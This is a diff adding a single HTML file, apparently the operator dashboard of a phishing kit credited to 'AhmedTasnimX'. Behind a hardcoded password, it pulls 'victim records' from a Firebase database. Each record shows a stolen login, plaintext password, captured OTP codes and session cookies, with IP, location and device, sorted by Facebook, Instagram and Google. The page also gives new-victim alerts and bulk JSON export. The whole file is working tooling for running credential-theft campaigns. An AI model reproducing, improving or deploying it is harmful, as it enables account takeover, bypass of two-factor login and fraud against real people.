@@ -1,0 +1,648 @@
+<!-- ═══════════════════════════════════════════════════════════
+     FILE: index.html - ড্যাশবোর্ড v4 (ফিক্সড + অ্যাডভান্সড)
+     ═══════════════════════════════════════════════════════════ -->
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔐 Secure Dashboard - AhmedTasnimX</title>
+    
+    <!-- Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --panel: #12121a;
+            --border: #1e1e2e;
+            --green: #00ff88;
+            --red: #ff4444;
+            --gold: #FFD700;
+            --cyan: #8be9fd;
+            --purple: #bd93f9;
+            --orange: #ff9800;
+            --pink: #ff6b9d;
+        }
+        
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            font-family: 'JetBrains Mono', 'Consolas', monospace;
+            background: var(--bg);
+            color: #fff;
+            min-height: 100vh;
+        }
+        
+        /* ════════════════════════════════════════════
+           LOCK SCREEN
+           ════════════════════════════════════════════ */
+        .lock-screen {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(135deg, #0a0a0f 0%, #1a0a1f 30%, #0f0a1a 60%, #0a0a0f 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        
+        .lock-card {
+            background: var(--panel);
+            border: 1px solid var(--purple);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(189,147,249,0.2);
+        }
+        
+        .lock-icon { font-size: 60px; margin-bottom: 20px; animation: lockPulse 2s infinite; }
+        @keyframes lockPulse { 0%,100%{transform:scale(1);} 50%{transform:scale(1.1);} }
+        
+        .lock-title { font-size: 22px; color: var(--purple); margin-bottom: 10px; letter-spacing: 2px; }
+        .lock-subtitle { color: rgba(255,255,255,0.5); font-size: 13px; margin-bottom: 25px; }
+        
+        .lock-input {
+            width: 100%;
+            padding: 14px 18px;
+            background: rgba(255,255,255,0.05);
+            border: 2px solid var(--border);
+            border-radius: 10px;
+            color: white;
+            font-family: inherit;
+            font-size: 16px;
+            text-align: center;
+            letter-spacing: 3px;
+            margin-bottom: 15px;
+            outline: none;
+            transition: border-color 0.3s;
+        }
+        .lock-input:focus { border-color: var(--purple); box-shadow: 0 0 15px rgba(189,147,249,0.3); }
+        
+        .lock-btn {
+            width: 100%;
+            padding: 14px;
+            background: var(--purple);
+            color: var(--bg);
+            border: none;
+            border-radius: 10px;
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .lock-btn:hover { box-shadow: 0 10px 30px rgba(189,147,249,0.4); }
+        
+        .lock-error { color: var(--red); font-size: 13px; margin-top: 10px; display: none; }
+        
+        .lock-footer { margin-top: 20px; color: rgba(255,255,255,0.3); font-size: 11px; }
+        
+        /* ════════════════════════════════════════════
+           DASHBOARD
+           ════════════════════════════════════════════ */
+        .dashboard {
+            display: none;
+            padding: 20px;
+        }
+        
+        .header {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+        
+        .header h1 { color: var(--green); font-size: 24px; letter-spacing: 2px; }
+        
+        .header-info { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
+        
+        .live-indicator { display: flex; align-items: center; gap: 8px; }
+        .live-dot { width: 10px; height: 10px; background: var(--green); border-radius: 50%; animation: blink 1s infinite; }
+        @keyframes blink { 0%,100%{opacity:1;} 50%{opacity:0.3;} }
+        
+        .export-btn, .logout-btn {
+            padding: 9px 16px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        .export-btn { background: var(--cyan); color: var(--bg); }
+        .logout-btn { background: var(--red); color: white; }
+        
+        /* Stats */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+            gap: 12px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 18px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        .stat-card:hover { border-color: var(--green); transform: translateY(-2px); }
+        .stat-card .number { font-size: 30px; font-weight: bold; color: var(--gold); }
+        .stat-card .label { color: rgba(255,255,255,0.6); font-size: 11px; margin-top: 5px; }
+        
+        /* Search */
+        .search-bar {
+            width: 100%;
+            padding: 12px 16px;
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: white;
+            font-family: inherit;
+            font-size: 14px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+        .search-bar:focus { border-color: var(--green); }
+        
+        /* Tabs */
+        .tabs { display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }
+        .tab-btn {
+            padding: 9px 16px;
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            color: white;
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 13px;
+            transition: all 0.3s;
+        }
+        .tab-btn.active { background: var(--green); color: var(--bg); font-weight: bold; }
+        .tab-btn:hover { border-color: var(--green); }
+        
+        /* Victim Card */
+        .victim-list {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 20px;
+        }
+        
+        .victim-card {
+            background: rgba(255,255,255,0.03);
+            border: 1px solid var(--border);
+            border-radius: 10px;
+            padding: 18px;
+            margin-bottom: 12px;
+        }
+        
+        .victim-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        
+        .victim-platform {
+            padding: 4px 12px;
+            background: var(--purple);
+            color: var(--bg);
+            border-radius: 20px;
+            font-size: 11px;
+            font-weight: bold;
+            text-transform: uppercase;
+        }
+        
+        .victim-time { font-size: 11px; color: rgba(255,255,255,0.5); }
+        
+        .victim-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 8px;
+        }
+        
+        .info-item {
+            background: rgba(255,255,255,0.02);
+            padding: 10px;
+            border-radius: 8px;
+        }
+        .info-item .key { color: rgba(255,255,255,0.5); font-size: 10px; text-transform: uppercase; letter-spacing: 1px; }
+        .info-item .value { color: #fff; font-size: 13px; margin-top: 3px; word-break: break-all; }
+        
+        .otp-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            background: var(--orange);
+            color: var(--bg);
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: bold;
+        }
+        
+        .cookie-badge {
+            display: inline-block;
+            padding: 3px 8px;
+            background: var(--cyan);
+            color: var(--bg);
+            border-radius: 4px;
+            font-size: 10px;
+            font-weight: bold;
+        }
+        
+        .no-victims { text-align: center; padding: 40px; color: rgba(255,255,255,0.3); font-size: 15px; }
+        
+        .delete-btn {
+            padding: 5px 10px;
+            background: var(--red);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 11px;
+            font-family: inherit;
+        }
+    </style>
+</head>
+<body>
+    <!-- LOCK SCREEN -->
+    <div class="lock-screen" id="lockScreen">
+        <div class="lock-card">
+            <div class="lock-icon">🔐</div>
+            <div class="lock-title">SECURE DASHBOARD</div>
+            <div class="lock-subtitle">Enter password to access</div>
+            <input type="password" class="lock-input" id="lockPassword" placeholder="••••••••••" autocomplete="off">
+            <button class="lock-btn" onclick="checkPassword()">UNLOCK</button>
+            <div class="lock-error" id="lockError">❌ Wrong password!</div>
+            <div class="lock-footer">
+                Developed by <span style="color:var(--purple);font-weight:bold;">AhmedTasnimX</span>
+            </div>
+        </div>
+    </div>
+    
+    <!-- DASHBOARD -->
+    <div class="dashboard" id="dashboard">
+        <div class="header">
+            <div>
+                <h1>🎯 PHISHING DASHBOARD</h1>
+                <p style="color:rgba(255,255,255,0.5);font-size:11px;">
+                    Real-time monitoring | <span style="color:var(--purple);">AhmedTasnimX</span>
+                </p>
+            </div>
+            <div class="header-info">
+                <div class="live-indicator"><div class="live-dot"></div><span style="color:var(--green);font-size:12px;">LIVE</span></div>
+                <button class="export-btn" onclick="exportData()">📥 Export</button>
+                <button class="logout-btn" onclick="logout()">🚪 Logout</button>
+            </div>
+        </div>
+        
+        <!-- Stats -->
+        <div class="stats-grid">
+            <div class="stat-card" onclick="setFilter('all')"><div class="number" id="totalVictims">0</div><div class="label">Total</div></div>
+            <div class="stat-card" onclick="setFilter('facebook')"><div class="number" id="facebookCount">0</div><div class="label">Facebook</div></div>
+            <div class="stat-card" onclick="setFilter('instagram')"><div class="number" id="instagramCount">0</div><div class="label">Instagram</div></div>
+            <div class="stat-card" onclick="setFilter('google')"><div class="number" id="googleCount">0</div><div class="label">Google</div></div>
+            <div class="stat-card" onclick="setFilter('other')"><div class="number" id="otherCount">0</div><div class="label">Others</div></div>
+            <div class="stat-card" onclick="setFilter('otp')"><div class="number" id="otpCount">0</div><div class="label">🔑 OTP</div></div>
+            <div class="stat-card" onclick="setFilter('cookie')"><div class="number" id="cookieCount">0</div><div class="label">🍪 Cookie</div></div>
+        </div>
+        
+        <!-- Search -->
+        <input type="text" class="search-bar" id="searchInput" placeholder="🔍 Search by email, IP, phone, OTP, cookie..." onkeyup="searchVictims(this.value)">
+        
+        <!-- Tabs -->
+        <div class="tabs" id="tabsContainer">
+            <button class="tab-btn active" data-filter="all" onclick="setFilter('all')">All</button>
+            <button class="tab-btn" data-filter="facebook" onclick="setFilter('facebook')">Facebook</button>
+            <button class="tab-btn" data-filter="instagram" onclick="setFilter('instagram')">Instagram</button>
+            <button class="tab-btn" data-filter="google" onclick="setFilter('google')">Google</button>
+            <button class="tab-btn" data-filter="other" onclick="setFilter('other')">Others</button>
+            <button class="tab-btn" data-filter="otp" onclick="setFilter('otp')">🔑 OTP</button>
+            <button class="tab-btn" data-filter="cookie" onclick="setFilter('cookie')">🍪 Cookie</button>
+        </div>
+        
+        <!-- Victim List -->
+        <div class="victim-list">
+            <h3 style="margin-bottom:15px;color:var(--red);">📋 VICTIM RECORDS</h3>
+            <div id="victimContainer"><div class="no-victims">⏳ Waiting...</div></div>
+        </div>
+    </div>
+    
+    <!-- Config + Logic -->
+    <script src="./config.js"></script>
+    <script>
+        // ════════════════════════════════════════════
+        // LOCK SCREEN
+        // ════════════════════════════════════════════
+        const CORRECT_PASSWORD = "Sorwer Sir";
+        
+        function checkPassword() {
+            const input = document.getElementById('lockPassword').value;
+            const error = document.getElementById('lockError');
+            
+            if (input === CORRECT_PASSWORD) {
+                document.getElementById('lockScreen').style.display = 'none';
+                document.getElementById('dashboard').style.display = 'block';
+                initFirebase();
+                sessionStorage.setItem('dx_unlocked', 'true');
+            } else {
+                error.style.display = 'block';
+                document.getElementById('lockPassword').value = '';
+                document.getElementById('lockPassword').focus();
+            }
+        }
+        
+        document.getElementById('lockPassword').addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') checkPassword();
+        });
+        
+        function logout() {
+            sessionStorage.removeItem('dx_unlocked');
+            document.getElementById('dashboard').style.display = 'none';
+            document.getElementById('lockScreen').style.display = 'flex';
+            document.getElementById('lockPassword').value = '';
+            document.getElementById('lockError').style.display = 'none';
+        }
+        
+        if (sessionStorage.getItem('dx_unlocked') === 'true') {
+            document.getElementById('lockScreen').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'block';
+            initFirebase();
+        }
+        
+        // ════════════════════════════════════════════
+        // FIREBASE
+        // ════════════════════════════════════════════
+        let database = null;
+        let allVictims = {};
+        let currentFilter = 'all';
+        let currentSearch = '';
+        
+        function initFirebase() {
+            if (database) return;
+            
+            firebase.initializeApp(window.firebaseConfig);
+            database = firebase.database();
+            
+            database.ref('victims').on('value', (snapshot) => {
+                allVictims = snapshot.val() || {};
+                renderVictims();
+            });
+            
+            database.ref('victims').on('child_added', (snapshot) => {
+                const victim = snapshot.val();
+                showNotification(victim);
+                playAlert();
+            });
+        }
+        
+        // ════════════════════════════════════════════
+        // HELPERS
+        // ════════════════════════════════════════════
+        
+        // কুকি অবজেক্ট বা স্ট্রিং — দুটোই হ্যান্ডেল করবে
+        function getCookieString(v) {
+            if (!v) return '';
+            
+            // Direct string
+            if (typeof v.cookies === 'string' && v.cookies.length > 0) return v.cookies;
+            if (typeof v.cookieData === 'string' && v.cookieData.length > 0) return v.cookieData;
+            if (typeof v.cookieString === 'string' && v.cookieString.length > 0) return v.cookieString;
+            
+            // Object
+            if (v.cookies && typeof v.cookies === 'object') {
+                const entries = Object.entries(v.cookies);
+                if (entries.length > 0) {
+                    return entries.map(([k, val]) => k + '=' + val).join('; ');
+                }
+            }
+            if (v.cookieData && typeof v.cookieData === 'object') {
+                const entries = Object.entries(v.cookieData);
+                if (entries.length > 0) {
+                    return entries.map(([k, val]) => k + '=' + val).join('; ');
+                }
+            }
+            return '';
+        }
+        
+        function hasCookie(v) {
+            return getCookieString(v).length > 0;
+        }
+        
+        function getOTP(v) {
+            return v.otp || v.otpCode || v.otp_input || '';
+        }
+        
+        function hasOTP(v) {
+            return getOTP(v).length > 0;
+        }
+        
+        function getIP(v) {
+            return v.ipInfo?.ip || v.ip || v.ipAddress || 'N/A';
+        }
+        
+        // ════════════════════════════════════════════
+        // RENDER
+        // ════════════════════════════════════════════
+        
+        function renderVictims() {
+            const container = document.getElementById('victimContainer');
+            const ids = Object.keys(allVictims);
+            
+            updateStats();
+            
+            let filtered = ids.filter(id => {
+                const v = allVictims[id];
+                if (!v) return false;
+                
+                if (currentFilter === 'otp') return hasOTP(v);
+                if (currentFilter === 'cookie') return hasCookie(v);
+                if (currentFilter === 'other') return !['facebook','instagram','google'].includes(v.platform);
+                if (currentFilter !== 'all') return v.platform === currentFilter;
+                
+                if (currentSearch) {
+                    const searchStr = JSON.stringify(v).toLowerCase();
+                    if (!searchStr.includes(currentSearch.toLowerCase())) return false;
+                }
+                return true;
+            });
+            
+            filtered.sort((a, b) => {
+                return new Date(allVictims[b].timestamp || 0) - new Date(allVictims[a].timestamp || 0);
+            });
+            
+            if (filtered.length === 0) {
+                container.innerHTML = '<div class="no-victims">⏳ No victims found</div>';
+                return;
+            }
+            
+            let html = '';
+            filtered.forEach(id => { html += createVictimCard(allVictims[id], id); });
+            container.innerHTML = html;
+        }
+        
+        function createVictimCard(v, id) {
+            const time = new Date(v.timestamp || Date.now()).toLocaleString();
+            const platform = (v.platform || 'unknown').toUpperCase();
+            const email = v.email || v.username || v.fullName || 'Unknown';
+            const password = v.password || 'N/A';
+            const ip = getIP(v);
+            const location = (v.ipInfo?.city || 'N/A') + ', ' + (v.ipInfo?.country || 'N/A');
+            const isp = v.ipInfo?.isp || 'N/A';
+            const device = (v.deviceInfo?.device || 'N/A') + ' / ' + (v.deviceInfo?.os || 'N/A');
+            const browser = v.deviceInfo?.browser || 'N/A';
+            const otp = getOTP(v);
+            const cookieStr = getCookieString(v);
+            
+            return `
+                <div class="victim-card">
+                    <div class="victim-header">
+                        <span class="victim-platform">${platform}</span>
+                        <span style="color:var(--cyan);font-weight:bold;">${email}</span>
+                        <span class="victim-time">${time}</span>
+                    </div>
+                    <div class="victim-info">
+                        <div class="info-item">
+                            <div class="key">Password</div>
+                            <div class="value" style="color:var(--red);font-weight:bold;">${password}</div>
+                        </div>
+                        ${otp ? `<div class="info-item">
+                            <div class="key">OTP <span class="otp-badge">CAPTURED</span></div>
+                            <div class="value" style="color:var(--orange);font-weight:bold;">${otp}</div>
+                        </div>` : ''}
+                        ${cookieStr ? `<div class="info-item">
+                            <div class="key">Cookie <span class="cookie-badge">CAPTURED</span></div>
+                            <div class="value" style="font-size:11px;">${cookieStr.substring(0, 100)}${cookieStr.length > 100 ? '...' : ''}</div>
+                        </div>` : ''}
+                        <div class="info-item">
+                            <div class="key">IP</div>
+                            <div class="value">${ip}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="key">Location</div>
+                            <div class="value">${location}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="key">ISP</div>
+                            <div class="value">${isp}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="key">Device</div>
+                            <div class="value">${device}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="key">Browser</div>
+                            <div class="value">${browser}</div>
+                        </div>
+                    </div>
+                    <div style="margin-top:10px;text-align:right;">
+                        <button class="delete-btn" onclick="deleteVictim('${id}')">🗑️ Delete</button>
+                    </div>
+                </div>
+            `;
+        }
+        
+        function updateStats() {
+            const ids = Object.keys(allVictims);
+            let fb = 0, ig = 0, gg = 0, other = 0, otp = 0, cookie = 0;
+            
+            ids.forEach(id => {
+                const v = allVictims[id];
+                if (!v) return;
+                if (v.platform === 'facebook') fb++;
+                else if (v.platform === 'instagram') ig++;
+                else if (v.platform === 'google') gg++;
+                else other++;
+                
+                if (hasOTP(v)) otp++;
+                if (hasCookie(v)) cookie++;
+            });
+            
+            document.getElementById('totalVictims').textContent = ids.length;
+            document.getElementById('facebookCount').textContent = fb;
+            document.getElementById('instagramCount').textContent = ig;
+            document.getElementById('googleCount').textContent = gg;
+            document.getElementById('otherCount').textContent = other;
+            document.getElementById('otpCount').textContent = otp;
+            document.getElementById('cookieCount').textContent = cookie;
+        }
+        
+        // ════════════════════════════════════════════
+        // FILTERS (Fixed)
+        // ════════════════════════════════════════════
+        
+        function setFilter(filter) {
+            currentFilter = filter;
+            document.querySelectorAll('.tab-btn').forEach(btn => {
+                btn.classList.remove('active');
+                if (btn.dataset.filter === filter) btn.classList.add('active');
+            });
+            renderVictims();
+        }
+        
+        function searchVictims(query) {
+            currentSearch = query;
+            renderVictims();
+        }
+        
+        function deleteVictim(id) {
+            if (confirm('Delete this victim?')) {
+                database.ref('victims/' + id).remove();
+            }
+        }
+        
+        function exportData() {
+            const dataStr = JSON.stringify(allVictims, null, 2);
+            const blob = new Blob([dataStr], {type: 'application/json'});
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'victims_' + Date.now() + '.json';
+            a.click();
+            URL.revokeObjectURL(url);
+        }
+        
+        function showNotification(victim) {
+            if (Notification.permission === 'granted') {
+                new Notification('🎯 New Victim!', {
+                    body: (victim.platform || 'unknown') + ' - ' + (victim.email || victim.username || 'Unknown'),
+                });
+            }
+        }
+        
+        if (Notification.permission === 'default') {
+            Notification.requestPermission();
+        }
+        
+        function playAlert() {
+            try {
+                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.frequency.value = 800;
+                osc.type = 'sine';
+                gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.5);
+            } catch(e) {}
+        }
+    </script>
+</body>
+</html>
